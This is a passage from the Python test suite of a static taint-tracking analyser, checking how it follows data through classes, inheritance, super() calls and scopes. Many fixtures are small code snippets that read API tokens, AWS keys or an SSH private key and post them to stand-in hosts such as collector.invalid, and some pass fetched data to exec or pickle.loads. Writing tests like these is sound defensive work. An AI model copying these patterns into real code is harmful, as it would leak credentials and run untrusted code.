                    requests.post("https://x.invalid", data=body)  # STATIC
                @classmethod
                def post(cls, body):
                    requests.post("https://x.invalid", data=body)  # CLASS
            Api.send(os.getenv("API_TOKEN"))
            Api.post(os.getenv("API_TOKEN"))
            """
        )
        assert _summary(true_flow) == [("TT3", _line(true_flow, "# SINK"))]
        assert _run(shifted) == []
        assert _summary(static_and_class) == sorted(
            ("TT3", _line(static_and_class, marker)) for marker in ("# STATIC", "# CLASS")
        )

    def test_constructors_bind_to_init(self) -> None:
        by_name = _code(
            """
            import os, requests
            class Client:
                def __init__(self, token):
                    self.token = token
                def send(self):
                    requests.post("https://x.invalid", headers={"A": self.token})  # SINK
            Client(os.getenv("API_TOKEN")).send()
            """
        )
        by_cls = _code(
            """
            import os, requests
            class Client:
                def __init__(self, token):
                    requests.post("https://auth.invalid", data={"token": token})  # SINK
                @classmethod
                def from_env(cls):
                    token = os.environ.get("API_TOKEN")
                    return cls(token)
            """
        )
        for code in (by_name, by_cls):
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code

    def test_super_calls_use_the_base_lookup(self) -> None:
        returned = _code(
            """
            import os, requests
            class Base:
                def auth(self):
                    token = os.environ["TOKEN"]
                    return token
            class Child(Base):
                def send(self):
                    token = super().auth()
                    requests.post("https://x.invalid", data=token)  # ZERO_ARG
                def send2(self):
                    requests.post("https://x.invalid", data=super(Child, self).auth())  # TWO_ARG
            """
        )
        unrelated_init = _code(
            """
            import os, requests
            class Credentials:
                def __init__(self, token):
                    self.token = token
            class EnvCredentials(Credentials):
                def __init__(self):
                    super().__init__(os.environ.get("API_TOKEN"))
            class Downloader:
                def __init__(self, url):
                    self.url = url
                def fetch(self):
                    return requests.get(self.url, timeout=10)
            class ApiError(Exception):
                def __init__(self, message):
                    super().__init__(message)
            def run(cmd):
                raise ApiError(requests.get(cmd).text)
            """
        )
        overridden = _code(
            """
            import os, requests
            class Base:
                def send(self, payload):
                    print(payload)
                def auth(self):
                    return "public"
            class Child(Base):
                def send(self, payload):
                    requests.post("https://x.invalid", data=payload)
                def auth(self):
                    return os.getenv("TOKEN")
                def run(self):
                    super().send(os.getenv("TOKEN"))
                    requests.post("https://x.invalid", data=super().auth())
            """
        )
        assert _summary(returned) == [
            ("TT3", _line(returned, "# ZERO_ARG")),
            ("TT3", _line(returned, "# TWO_ARG")),
        ]
        assert _run(unrelated_init) == []
        assert _run(overridden) == []

    def test_attributes_are_seen_by_the_class_and_its_subclasses(self) -> None:
        set_in_init = _code(
            """
            import os, requests
            class Client:
                TOKEN = os.getenv("CLASS_TOKEN")
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
                def send(self):
                    token = self.token
                    requests.post("https://x.invalid", data=token)  # LOCAL
                def send_class(self):
                    requests.post("https://x.invalid", headers={"A": self.TOKEN})  # CLASS
            class Child(Client):
                def send_child(self):
                    requests.post("https://x.invalid", data=self.token)  # CHILD
            """
        )
        parent_reads = _code(
            """
            import os, requests
            class Base:
                def send(self):
                    requests.post("https://x.invalid", data=self.token)
            class Child(Base):
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
            """
        )
        assert _summary(set_in_init) == sorted(
            ("TT3", _line(set_in_init, marker)) for marker in ("# LOCAL", "# CLASS", "# CHILD")
        )
        # A base never reads a subclass's attributes (no shared hierarchy namespace).
        assert _run(parent_reads) == []

    def test_class_scope_defaults(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                TOKEN = os.getenv("API_TOKEN")
                def send(self, token=TOKEN):
                    requests.post("https://x.invalid", data=token)  # SINK
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_constructed_receivers_bind_and_return(self) -> None:
        """``Class().m(...)`` and ``cls().m(...)`` call ``m`` on an instance of
        an in-file class: arguments bind and the return value is read."""
        returned = _code(
            """
            import os, requests
            class Collector:
                def collect(self):
                    token = os.environ.get("API_KEY")
                    return token
                @classmethod
                def load(cls):
                    payload = cls().collect()  # FROM_CLS
                    requests.post("https://x.invalid", data=payload)  # SINK_CLS
            def main():
                payload = Collector().collect()  # FROM_NAME
                requests.post("https://x.invalid", data=payload)  # SINK_NAME
            """
        )
        assert sorted(
            (f.rule_id, f.start_line, f.message.split(" →")[0]) for f in _run(returned)
        ) == [
            (
                "TT3",
                _line(returned, "# SINK_CLS"),
                f"Tainted flow: 'payload' from os.environ.get (line {_line(returned, '# FROM_CLS')}, "
                "credential/environment)",
            ),
            (
                "TT3",
                _line(returned, "# SINK_NAME"),
                f"Tainted flow: 'payload' from os.environ.get (line {_line(returned, '# FROM_NAME')}, "
                "credential/environment)",
            ),
        ]
        other_lanes = _code(
            """
            import requests
            class Fetcher:
                def code(self):
                    return requests.get("https://x.invalid/script").text
                def creds(self):
                    return open("creds.txt").read()
            exec(Fetcher().code())
            requests.post("https://x.invalid", data=Fetcher().creds())
            """
        )
        assert [f.rule_id for f in _run(other_lanes)] == ["TT5", "TT4"]
        bound = _code(
            """
            import os, requests
            class Uploader:
                def upload(self, body):
                    requests.post("https://x.invalid", data=body)  # SINK
            Uploader().upload(os.environ.get("API_KEY"))
            """
        )
        assert _summary(bound) == [("TT3", _line(bound, "# SINK"))]
        # The constructed receiver is an instance: ``self`` is implicit.
        shifted = bound.replace("def upload(self, body):", "def upload(self, body, extra=None):")
        shifted = shifted.replace("data=body", "data=extra")
        assert _run(shifted) == []

    def test_unpacking_never_fills_the_implicit_receiver(self) -> None:
        """``*args`` / ``**kwargs`` / overflow arguments of a bound call never
        reach ``self`` / ``cls``: Python passes the receiver implicitly."""
        forwarded_init = _code(
            """
            import os, requests
            class BaseClient:
                DEFAULT_URL = "https://api.invalid"
                def __init__(self, api_key=None):
                    self.api_key = api_key
                    self.base_url = self.DEFAULT_URL
                def health(self):
                    return requests.get(self.base_url + "/health")
            class OpenAIClient(BaseClient):
                def __init__(self, *args, **kwargs):
                    super().__init__(*args, **kwargs)
            client = OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"))
            other = OpenAIClient(os.getenv("OPENAI_API_KEY"))
            """
        )
        bound_calls = _code(
            """
            import subprocess, requests
            class Tool:
                cmd = ["git", "status"]
                def send(self, *words):
                    requests.post("https://x.invalid", data=self.cmd)
                def configure(self, **opts):
                    subprocess.run(self.cmd)
                @classmethod
                def launch(cls, *names):
                    subprocess.run(cls.cmd)
                def run(self):
                    self.send(*input().split())
                    self.configure(**{"mode": input()})
                    Tool.launch(*input().split(","))
            Tool(**{"x": input()})
            """
        )
        assert _run(forwarded_init) == []
        assert _run(bound_calls) == []
        # An unbound ``Class.m(*args)`` does pass ``self`` explicitly.
        unbound = _code(
            """
            import subprocess
            class Runner:
                def go(self, label):
                    subprocess.run(self)  # SINK
            Runner.go(*input().split())
            """
        )
        assert _summary(unbound) == [("TT5", _line(unbound, "# SINK"))]
        # Positional forwarding still reaches the base's named parameter.
        true_flow = _code(
            """
            import os, requests
            class Base:
                def __init__(self, token=None):
                    requests.post("https://x.invalid", data=token)  # SINK
            class Child(Base):
                def __init__(self, *args, **kwargs):
                    super().__init__(*args, **kwargs)
            Child(os.getenv("API_TOKEN"))
            """
        )
        assert _summary(true_flow) == [("TT3", _line(true_flow, "# SINK"))]

    def test_forwarded_kwargs_bind_only_the_callees_kwargs(self) -> None:
        """A forwarded ``**kwargs`` is one value whose names are not tracked:
        it binds only into the callee's own ``**`` parameter, never into
        named or keyword-only parameters (``main`` binds nothing at all)."""
        base = _code(
            """
            import os, requests
            class BaseClient:
                def __init__(self, api_key=None, timeout=30):
                    self.api_key = api_key
                    self.timeout = timeout
                def health(self):
                    return requests.get("https://api.invalid/health", timeout=self.timeout)
                def send(self):
                    return requests.post("https://api.invalid", headers={"K": self.api_key})
            class OpenAIClient(BaseClient):
                def __init__(self, **kwargs):
                    super().__init__(**kwargs)
            """
        )
        for call in (
            'OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"))',
            'OpenAIClient(api_key=os.getenv("OPENAI_API_KEY"), timeout=10).health()',
            'OpenAIClient(**{"api_key": os.getenv("OPENAI_API_KEY")})',
        ):
            assert _run(base + call + "\n") == [], call
        wrapper = _code(
            """
            import os, requests
            def fetch(url=None, token=None):
                return requests.get(url, timeout=5)
            def wrapper(**kw):
                return fetch(**kw)
            wrapper(url="https://status.invalid", token=os.getenv("API_TOKEN"))
            """
        )
        assert _run(wrapper) == []
        # Into a callee that takes ``**kwargs`` itself, the value does flow.
        into_kwargs = _code(
            """
            import os, requests
            def send(**opts):
                requests.post("https://x.invalid", json=opts)  # SINK
            def wrapper(**kw):
                return send(**kw)
            wrapper(token=os.getenv("API_TOKEN"))
            """
        )
        assert _summary(into_kwargs) == [("TT3", _line(into_kwargs, "# SINK"))]

    def test_overflow_arguments_never_fill_earlier_parameters(self) -> None:
        cap = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS
        params = ", ".join(f"p{i}" for i in range(cap))
        code = (
            "import subprocess\n"
            "class Tool:\n"
            f"    def run(self, {params}, *rest):\n"
            "        subprocess.run(self)\n"
            "        subprocess.run(p0)\n"
            "        subprocess.run(rest)  # SINK\n"
            f"Tool().run({', '.join(['1'] * cap)}, input())\n"
        )
        assert _summary(code) == [("TT5", _line(code, "# SINK"))]

    def test_constructors_also_bind_to_new(self) -> None:
        for parameter in ("secret", "value"):
            code = _code(
                f"""
                import os, requests
                class C:
                    def __new__(cls, {parameter}):
                        requests.post("http://x.invalid", data={parameter})  # SINK
                        return super().__new__(cls)
                secret = os.environ.get("KEY")
                C(secret)
                """
            )
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], parameter
        # ``cls`` is implicit in ``C(x)``: the first argument never fills it.
        shifted = _code(
            """
            import os, requests
            class C:
                def __new__(cls, user="x", body="public"):
                    requests.post("http://x.invalid", data=cls)
                    return super().__new__(cls)
            C(os.getenv("KEY"))
            C(**{"user": os.getenv("KEY")})
            """
        )
        assert _run(shifted) == []

    def test_method_lookup_follows_c3_order(self) -> None:
        """In a diamond, ``D(B, C)`` with ``B(A)`` and ``C(A)`` resolves ``m``
        on ``C`` before ``A``, as Python's MRO does."""
        diamond = _code(
            """
            import os, requests
            class A:
                def send(self, body):
                    requests.post("https://x.invalid", data=body)  # A_SINK
            class B(A):
                pass
            class C(A):
                def send(self, body):
                    print("local only")
            class D(B, C):
                def go(self):
                    super().send(os.getenv("TOKEN"))
                def run(self):
                    self.send(os.getenv("TOKEN"))
            """
        )
        assert _run(diamond) == []
        mirrored = diamond.replace(
            'print("local only")', 'requests.post("https://x.invalid", data=body)'
        ).replace('requests.post("https://x.invalid", data=body)  # A_SINK', "print(body)")
        assert [f.rule_id for f in _run(mirrored)] == ["TT3"]

    def test_lookup_is_bounded_to_the_nearest_ancestors(self) -> None:
        """The lookup visits ``_MAX_ANCESTORS`` classes, the class included."""
        depth = behavioral_taint_tracking._MAX_ANCESTORS

        def chain(levels_up: int) -> str:
            classes = [
                "class K0:\n"
                "    def send(self, body):\n"
                '        requests.post("https://x.invalid", data=body)\n'
            ]
            classes += [f"class K{i}(K{i - 1}):\n    pass\n" for i in range(1, levels_up)]
            classes.append(
                f"class K{levels_up}(K{levels_up - 1}):\n"
                "    def go(self):\n"
                '        self.send(os.getenv("TOKEN"))\n'
            )
            return "import os, requests\n" + "".join(classes)

        assert [f.rule_id for f in _run(chain(depth - 1))] == ["TT3"]
        assert _run(chain(depth)) == []

    def test_lookup_bound_holds_with_several_bases(self) -> None:
        """The cap counts classes in C3 order also when the merge has several
        bases: the 8th class is searched, the 9th is not."""

        def module(owner: int) -> str:
            lines = ["import os, requests"]
            for i in range(8):
                if i == owner:
                    lines += [
                        f"class A{i}:",
                        "    def send(self, payload):",
                        '        requests.post("https://x.invalid", data=payload)',
                    ]
                else:
                    lines.append(f"class A{i}: pass")
            lines += [
                "class D(" + ", ".join(f"A{i}" for i in range(8)) + "):",
                "    def go(self):",
                '        self.send(os.getenv("API_KEY"))',
            ]
            return "\n".join(lines) + "\n"

        assert behavioral_taint_tracking._MAX_ANCESTORS == 8
        assert [f.rule_id for f in _run(module(6))] == ["TT3"]  # D, A0..A6: 8th
        assert _run(module(7)) == []  # A7 is the 9th class in the order

    def test_c3_keeps_local_precedence_and_every_base(self) -> None:
        """``class C(B1, B2, B3)`` with ``B1(B3)`` resolves ``B2`` before
        ``B3``, and a base past the 8th still constrains the order."""
        local = _code(
            """
            import os, requests, subprocess
            class B3:
                def handle(self, value):
                    subprocess.run(value)
            class B1(B3):
                pass
            class B2:
                def handle(self, value):
                    requests.post("https://x.invalid", data=value)  # SINK
            class C(B1, B2, B3):
                def go(self):
                    self.handle(os.getenv("API_KEY"))
            """
        )
        assert _summary(local) == [("TT3", _line(local, "# SINK"))]
        nine = (
            "import os, requests, subprocess\n"
            "class X:\n    def handle(self, value):\n        subprocess.run(value)\n"
            "class A0(X): pass\n"
            "class A1:\n    def handle(self, value):\n"
            '        requests.post("https://x.invalid", data=value)  # SINK\n'
            + "".join(f"class A{i}: pass\n" for i in range(2, 8))
            + "class A8(X): pass\n"
            "class D(" + ", ".join(f"A{i}" for i in range(9)) + "):\n"
            '    def go(self):\n        self.handle(os.getenv("API_KEY"))\n'
        )
        assert _summary(nine) == [("TT3", _line(nine, "# SINK"))]

    def test_self_and_plain_cls_calls_are_not_constructors(self) -> None:
        """Only a classmethod's ``cls(...)`` constructs; ``self()`` and the
        first parameter of an undecorated method (a metaclass's ``cls``) do
        not."""
        for code in (
            _code(
                """
                import os, requests
                class Vault:
                    def load(self):
                        return os.environ.get("TOKEN")
                    def push(self):
                        v = self().load()
                        requests.post("https://x.invalid", data=v)
                """
            ),
            _code(
                """
                import os, requests
                class Meta(type):
                    def secret(cls):
                        return os.environ.get("TOKEN")
                    def make(cls):
                        v = cls().secret()
                        requests.post("https://x.invalid", data=v)
                """
            ),
            _code(
                """
                import os, requests
                class Client:
                    def __init__(self, token=None):
                        requests.post("https://x.invalid", data=token)
                    def __call__(self, token):
                        return token
                    def rebuild(self):
                        self(os.environ.get("TOKEN"))
                """
            ),
        ):
            assert _run(code) == [], code

    def test_a_subclass_body_shadows_a_base_class_attribute(self) -> None:
        shadowed = _code(
            """
            import os, requests
            class Base:
                token = os.environ.get("SERVICE_TOKEN")
            class PublicProbe(Base):
                token = None
                def ping(self):
                    requests.get("https://status.invalid", headers={"X-Token": self.token})
            class MethodProbe(Base):
                def token(self):
                    return "public"
                def ping(self):
                    requests.get("https://status.invalid", headers={"X-Token": self.token})
            """
        )
        assert _run(shadowed) == []
        own = _code(
            """
            import os, requests
            class Base:
                token = os.environ.get("SERVICE_TOKEN")
            class Probe(Base):
                token = os.environ.get("PROBE_TOKEN")  # OWN
                def ping(self):
                    requests.get("https://status.invalid", headers={"X-Token": self.token})
            """
        )
        (finding,) = _run(own)
        assert f"'self.token' from os.environ.get (line {_line(own, '# OWN')}," in finding.message
        # Any class-body binding shadows, also without a modelled value; an
        # annotation without a value binds nothing and does not.
        for binding in (
            'api_key: str = "public"',
            "api_key: Optional[str] = None",
            'api_key: ClassVar[str] = ""',
            "from json import dumps as api_key",
        ):
            code = _code(
                f"""
                import os, requests
                from typing import ClassVar, Optional
                class Base:
                    api_key = os.environ["KEY"]
                class Public(Base):
                    {binding}
                    def send(self):
                        requests.post("https://x.invalid", headers={{"k": self.api_key}})
                """
            )
            assert _run(code) == [], binding
        annotation_only = _code(
            """
            import os, requests
            class Base:
                api_key = os.environ["KEY"]
            class Public(Base):
                api_key: str
                def send(self):
                    requests.post("https://x.invalid", headers={"k": self.api_key})
            """
        )
        assert [f.rule_id for f in _run(annotation_only)] == ["TT3"]
        # An instance store in the subclass does not hide the class value
        # (flow-insensitive, as documented).
        instance = _code(
            """
            import os, requests
            class Base:
                token = os.environ.get("SERVICE_TOKEN")
            class Probe(Base):
                def __init__(self):
                    self.token = None
                def ping(self):
                    requests.get("https://status.invalid", headers={"X-Token": self.token})
            """
        )
        assert [f.rule_id for f in _run(instance)] == ["TT3"]

    def test_a_static_init_receives_the_arguments_without_an_instance(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                @staticmethod
                def __init__(token):
                    requests.post("https://x.invalid", data=token)  # SINK
            Client(os.getenv("API_TOKEN"))
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_method_kinds_and_receivers(self) -> None:
        """``__new__`` is static, a staticmethod's first parameter is no
        receiver, and ``super()`` resolves inside comprehensions and lambdas."""
        new_offset = _code(
            """
            import os, requests
            class Base:
                def __new__(cls, secret):
                    requests.post("https://x.invalid", data=secret)  # SINK
                    return object.__new__(cls)
            class Child(Base):
                def __new__(cls):
                    return super().__new__(cls, os.getenv("TOKEN"))
            """
        )
        static_first = _code(
            """
            import os, requests
            class Client:
                @staticmethod
                def configure(other):
                    other.token = os.getenv("TOKEN")
                def send(self):
                    requests.post("https://x.invalid", data=self.token)
            """
        )
        in_comprehension = _code(
            """
            import os, requests
            class Base:
                def send(self, v):
                    requests.post("https://x.invalid", data=v)  # SINK
            class Child(Base):
                def run(self):
                    [super().send(os.getenv("TOKEN")) for _ in range(1)]
            """
        )
        in_lambda = in_comprehension.replace(
            '[super().send(os.getenv("TOKEN")) for _ in range(1)]',
            '(lambda: super().send(os.getenv("TOKEN")))()',
        )
        shadowed = _code(
            """
            import os, requests
            def super():
                return Other()
            class Other:
                def send(self, v):
                    print(v)
            class Base:
                def send(self, v):
                    requests.post("https://x.invalid", data=v)
            class Child(Base):
                def run(self):
                    super().send(os.getenv("TOKEN"))
            """
        )
        inline_lambda = _code(
            """
            import os, requests
            (lambda v: requests.post("https://x.invalid", data=v))(os.getenv("TOKEN"))  # SINK
            """
        )
        assert _summary(new_offset) == [("TT3", _line(new_offset, "# SINK"))]
        assert _run(static_first) == []
        for code in (in_comprehension, in_lambda):
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code
        assert _run(shadowed) == []
        assert _summary(inline_lambda) == [("TT3", _line(inline_lambda, "# SINK"))]


class TestNotResolved:
    """Calls whose callee is not known from syntax alone bind nothing, as on main.

    Receiver type inference, the untyped-receiver fallback into every
    same-named method, callback rules and ``@property`` reads were dropped:
    each produced denial-of-service paths or false positives. Variable names
    differ from the callee's parameters, so neither version reports these.
    """

    def test_instance_receivers_do_not_bind(self) -> None:
        """Variables, attributes and casts holding an instance are not typed.

        (``Api().upload(...)`` and ``cls().upload(...)`` do bind: see
        ``TestMethods.test_constructed_receivers_bind_and_return``.)
        """
        for setup, call in (
            ("api = Api()", "api.upload(secret)"),
            ("api: Api = Api()", "api.upload(secret)"),
            ("api = cast(Api, raw)", "api.upload(secret)"),
            ("self.api = Api()", "self.api.upload(secret)"),
        ):
            code = _code(
                f"""
                import os, requests
                from typing import cast
                class Api:
                    def upload(self, body):
                        requests.post("https://x.invalid", data=body)
                class Runner:
                    def main(self, raw):
                        secret = os.getenv("API_TOKEN")
                        {setup}
                        {call}
                """
            )
            assert _run(code) == [], call

    def test_returns_through_instance_variables_are_not_read(self) -> None:
        """The trade-off of dropping receiver typing: a value returned through
        an instance held in a variable or attribute is not followed. ``main``
        reports these only when the callee's local shares the caller's name."""
        for setup, call in (
            ("vault = Vault()", "vault.load()"),
            ("vault: Vault = Vault()", "vault.load()"),
            ("self.vault = Vault()", "self.vault.load()"),
        ):
            code = _code(
                f"""
                import os, requests
                class Vault:
                    def load(self):
                        token = os.environ.get("API_TOKEN")
                        return token
                class Runner:
                    def main(self):
                        {setup}
                        payload = {call}
                        requests.post("https://x.invalid", data=payload)
                """
            )
            assert _run(code) == [], call

    def test_untyped_receivers_never_fan_out_to_same_named_methods(self) -> None:
        code = _code(
            """
            import os, requests
            MODELS = {"small": "s"}
            class Uploader:
                def __init__(self, url):
                    self.url = url
                def format(self, record):
                    return requests.post(self.url, json={"record": record}, timeout=10)
                def get(self, model_id):
                    return requests.get(f"https://models.invalid/{model_id}")
            def banner():
                user = os.environ.get("USER", "unknown")
                return "Running as {}".format(user)
            def selected_model(params):
                params.get(os.environ.get("MODEL"))
                return MODELS.get(os.environ.get("MODEL_SIZE", "small"))
            """
        )
        assert _run(code) == []

    def test_callbacks_do_not_bind(self) -> None:
        for call in (
            "threading.Thread(target=upload, args=(secret,)).start()",
            "executor.submit(upload, secret)",
            "setattr(Client, 'token', secret)",
        ):
            code = _code(
                f"""
                import os, requests, threading
                def upload(body):
                    requests.post("https://example.invalid", data=body)
                class Client:
                    def __init__(self, url, token=None):
                        requests.post(url, data=token)
                def main(executor):
                    secret = os.getenv("API_KEY")
                    {call}
                """
            )
            assert _run(code) == [], call

    def test_properties_and_class_name_attributes_are_not_resolved(self) -> None:
        code = _code(
            """
            import os, requests
            class Config:
                TOKEN = os.getenv("API_TOKEN")
                @property
                def key(self):
                    return os.getenv("API_KEY")
                def send(self):
                    requests.post("https://x.invalid", data=self.key)
            def send():
                requests.post("https://x.invalid", data=Config.TOKEN)
            """
        )
        assert _run(code) == []

    def test_class_objects_reached_through_aliases_do_not_bind(self) -> None:
        """Only ``ClassName.m(obj, ...)`` binds with the unbound offset; an alias
        of the class binds nothing, as on main, so it cannot shift arguments."""
        for call in (
            "B.send(self, os.getenv('USER_NAME'), 'public')",
            "self.__class__.send(self, os.getenv('USER_NAME'), 'public')",
            "klass.send(self, os.getenv('USER_NAME'), 'public')",
            "self.kls.send(self, os.getenv('USER_NAME'), 'public')",
        ):
            code = _code(
                f"""
                import os, requests
                class Base:
                    def send(self, user, body):
                        print(user)
                        requests.post("https://x.invalid", data=body)
                B = Base
                class Child(Base):
                    def __init__(self):
                        self.kls = Base
                    def run(self):
                        klass = Base
                        {call}
                """
            )
            assert _run(code) == [], call

    def test_subclass_overrides_are_not_followed_from_the_base(self) -> None:
        code = _code(
            """
            import os, requests
            class Base:
                def token(self):
                    return "public"
                def send(self):
                    requests.post("https://x.invalid", data=self.token())
            class Child(Base):
                def token(self):
                    return os.getenv("API_TOKEN")
            """
        )
        assert _run(code) == []


class TestScopes:
    """Lambdas and comprehensions are scopes of their own, as in Python 3."""

    def test_walrus_inside_a_lambda_does_not_shadow_a_global(self) -> None:
        code = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            def send():
                reset = lambda: (TOKEN := None)
                requests.post("https://x.invalid", data=TOKEN)  # SINK
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_walrus_inside_a_comprehension_binds_in_the_function(self) -> None:
        code = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            def send():
                [(TOKEN := "public") for _ in range(1)]
                requests.post("https://x.invalid", data=TOKEN)
            """
        )
        assert _run(code) == []

    def test_comprehension_shadowing_keeps_the_outer_name(self) -> None:
        for comprehension in (
            "[token for token in ('a', 'b')]",
            "{token for token in ('a', 'b')}",
            "{token: 1 for token in ('a', 'b')}",
            "list(token for token in ('a', 'b'))",
            "[t for _ in 'x' for token in 'y']",
        ):
            code = _code(
                f"""
                import os, requests
                token = os.getenv("API_TOKEN")
                def send():
                    labels = {comprehension}
                    requests.post("https://x.invalid", data=token)  # SINK
                """
            )
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], comprehension

    def test_first_iterable_is_read_in_the_enclosing_scope(self) -> None:
        code = _code(
            """
            import os, requests
            def send():
                token = os.getenv("API_TOKEN")
                body = [token for token in token]  # ASSIGN
                requests.post("https://x.invalid", data=body)
            """
        )
        (finding,) = _flows(code)
        assert f"'body' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message

    def test_class_body_reads_see_the_module_global_until_the_class_binds_it(self) -> None:
        """A class body reads a name it also binds with LOAD_NAME: the class's
        value once bound, the module global before."""
        for body, rule in (
            ('requests.post("http://x.invalid", data=secret)\n    def secret(self): pass', "TT3"),
            ('secret = secret\n    requests.post("http://x.invalid", data=secret)', "TT3"),
            ("secret = secret.strip()\n    os.system(secret)", "TT2"),
            ("subprocess.run(secret, shell=True)\n    for secret in ():\n        pass", "TT2"),
            ('requests.post("http://x.invalid", data=secret)\n    import json as secret', "TT3"),
        ):
            code = (
                "import os, requests, subprocess\n"
                'secret = os.environ.get("KEY")\n'
                f"class Beacon:\n    {body}\n"
            )
            assert [f.rule_id for f in _run(code)] == [rule], body
        command = _code(
            """
            import os
            cmd = input()
            class Boot:
                cmd = cmd.strip()
                os.system(cmd)
            """
        )
        assert [f.rule_id for f in _run(command)] == ["TT5"]
        attribute = _code(
            """
            import os, requests
            API_KEY = os.getenv("API_KEY")
            class Client:
                API_KEY = API_KEY
                def send(self):
                    requests.post("https://x.invalid", data=self.API_KEY)  # SINK
            """
        )
        assert _summary(attribute) == [("TT3", _line(attribute, "# SINK"))]
        # In a class nested in a function, LOAD_NAME skips the function's
        # locals: ``secret = secret`` raises NameError and reads nothing.
        nested = _code(
            """
            import os, requests
            def outer():
                secret = os.environ.get("KEY")
                class Beacon:
                    secret = secret
                    requests.post("http://x.invalid", data=secret)
                return Beacon
            """
        )
        assert _run(nested) == []
        # A class body that only assigns a name reads nothing from the global.
        store_only = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            class Client:
                TOKEN = "public"
                def send(self):
                    requests.post("https://x.invalid", data=self.TOKEN)
            """
        )
        assert _run(store_only) == []
        # Reading the name in the class body does not give the class's own
        # value (and so ``self.TOKEN``) the global's taint.
        for read in ("print(TOKEN)", 'HEADERS = {"X-Token": TOKEN}'):
            code = _code(
                f"""
                import os, requests
                TOKEN = os.environ.get("TOKEN")
                class PublicClient:
                    TOKEN = "public-demo-token"
                    {read}
                    def ping(self):
                        return requests.get("https://x.invalid", headers={{"X": self.TOKEN}})
                """
            )
            assert _run(code) == [], read
        # The global reaches the class-body name in main's order, so the
        # message names the global's source as main does.
        ordered = _code(
            """
            import os
            X = os.getenv("CMD")
            Y = open("cmd.txt").read()
            class Boot:
                X = Y
                os.system(X)
            """
        )
        (finding,) = _run(ordered)
        assert finding.message == (
            "Tainted flow: 'X' from os.getenv (line 2, credential/environment) "
            "→ os.system (code execution)"
        )

    def test_global_declared_in_an_enclosing_function_is_global_in_nested_ones(self) -> None:
        code = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            def outer():
                TOKEN = "public"
                def middle():
                    global TOKEN
                    def inner():
                        requests.post("https://x.invalid", data=TOKEN)  # SINK
                    inner()
                middle()
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]


class TestSourceRank:
    """Each key keeps one source, the most severe; a helper can never downgrade it."""

    def test_helper_defined_first_does_not_preempt_the_credential(self) -> None:
        code = _code(
            """
            import os, requests
            def nonce():
                return requests.get("https://collector.invalid/nonce").text
            def run():
                token = os.getenv("API_KEY")
                body = nonce() + token  # BODY
                requests.post("https://collector.invalid/upload", data=body)
            """
        )
        (finding,) = _run(code)
        assert finding.rule_id == "TT3"
        assert f"'body' from os.getenv (line {_line(code, '# BODY')}," in finding.message

    def test_file_read_helper_does_not_preempt_the_credential(self) -> None:
        code = _code(
            """
            import os, requests
            def read_key():
                return open(os.path.expanduser("~/.ssh/id_rsa")).read()
            def collect():
                aws = os.environ["AWS_SECRET_ACCESS_KEY"]
                loot = {"key": read_key(), "aws": aws}
                requests.post("https://collector.invalid/x", json=loot)
            """
        )
        assert [f.rule_id for f in _run(code)] == ["TT3"]

    def test_reassignment_keeps_the_most_severe_source_in_either_order(self) -> None:
        """Each sink gets the most severe source for its kind, in either order."""
        credential, file_read = 'os.getenv("KEY")', 'open("notes.txt").read()'
        network, user = 'requests.get("https://x.invalid").text', 'input("cmd")'
        for sources, network_rule, exec_rule in (
            ((file_read, credential), "TT3", "TT2"),
            ((network, credential), "TT3", "TT5"),
            ((user, file_read), "TT4", "TT5"),
            ((credential, user), "TT3", "TT5"),
        ):
            for first, second in (sources, sources[::-1]):
                code = (
                    "import os, requests\n"
                    f"payload = {first}\n"
                    f"payload = {second}\n"
                    "body = payload\n"
                    'requests.post("https://x.invalid", data=body)\n'
                    "exec(body)\n"
                )
                rules = [f.rule_id for f in _run(code)]
                assert rules == [network_rule, exec_rule], (first, second)

    def test_a_helper_never_downgrades_execution_or_file_flows(self) -> None:
        """A helper's credential cannot hide user input reaching exec (TT5), nor
        a helper's network input a file read reaching the network (TT4)."""
        execution = _code(
            """
            import os, pickle, requests, subprocess
            def prefix():
                return os.getenv("SHELL_PREFIX")
            def run():
                user = input("cmd> ")
                cmd = prefix() + user  # CMD
                subprocess.run(cmd, shell=True)
                blob = requests.get("https://x.invalid/blob").content
                data = prefix() + blob  # DATA
                pickle.loads(data)
            """
        )
        upload = _code(
            """
            import requests
            def nonce():
                return requests.get("https://x.invalid/nonce").text
            def run():
                notes = open("notes.txt").read()
                body = nonce() + notes  # BODY
                requests.post("https://x.invalid/upload", data=body)
            """
        )
        assert [(f.rule_id, f.message.split(" (line")[0]) for f in _run(execution)] == [
            ("TT5", "Tainted flow: 'cmd' from input"),
            ("TT6", "Tainted flow: 'data' from requests.get"),
        ]
        assert [(f.rule_id, f.message.split(" (line")[0]) for f in _run(upload)] == [
            ("TT4", "Tainted flow: 'body' from open"),
        ]

    def test_seeded_assignment_still_reads_a_more_severe_variable(self) -> None:
        code = _code(
            """
            import os, requests
            token = os.getenv("API_KEY")
            body = requests.get("https://x.invalid").text + token  # BODY
            requests.post("https://x.invalid", data=body)
            """
        )
        (finding,) = _run(code)
        assert finding.rule_id == "TT3"
        assert f"'body' from os.getenv (line {_line(code, '# BODY')}," in finding.message

    def test_inline_sources_pick_the_most_severe(self) -> None:
        """The credential is deeper in the expression than the network source."""
        code = _code(
            """
            import os, requests
            body = requests.get("https://x.invalid").text + os.getenv("KEY").strip()
            requests.post("https://x.invalid", data=body)
            exec(body)
            """
        )
        assert [(f.rule_id, f.message.split(" (line")[0]) for f in _run(code)] == [
            ("TT3", "Tainted flow: 'body' from os.getenv"),
